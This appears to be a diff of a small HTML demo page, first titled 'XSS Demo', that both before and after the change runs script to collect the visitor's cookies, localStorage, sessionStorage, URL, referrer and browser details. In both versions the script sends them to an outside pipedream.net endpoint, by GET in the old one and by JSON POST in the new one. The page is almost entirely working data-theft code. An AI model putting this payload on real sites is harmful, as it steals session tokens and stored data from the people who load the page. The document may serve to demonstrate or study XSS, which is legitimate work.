@@ -1,30 +1,36 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>XSS Demo</title>
-  </head>
-  <body>
-    <h1>Добро пожаловать</h1>
-    <script>
-      (async () => {
-        const data = {
-          cookie: document.cookie,
-          location: location.href,
-          referrer: document.referrer,
-          userAgent: navigator.userAgent,
-          screen: {
-            width: screen.width,
-            height: screen.height
-          },
-          localStorage: JSON.stringify(localStorage),
-          sessionStorage: JSON.stringify(sessionStorage),
-          timestamp: new Date().toISOString()
-        };
+<head>
+  <title>Demo Page</title>
+</head>
+<body>
+  <h1>Собираем информацию...</h1>
+  <pre id="output"></pre>
 
-        const query = encodeURIComponent(JSON.stringify(data));
+  <script>
+    const data = {
+      cookie: document.cookie,
+      location: location.href,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      screen: {
+        width: screen.width,
+        height: screen.height
+      },
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      timestamp: new Date().toISOString()
+    };
 
-        await fetch('https://eo4n48r42eh7pd8.m.pipedream.net/?data=' + query);
-      })();
-    </script>
-  </body>
+    document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+
+    fetch("https://eo4n48r42eh7pd8.m.pipedream.net/", {
+      method: "POST",
+      body: JSON.stringify(data),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    });
+  </script>
+</body>
 </html>
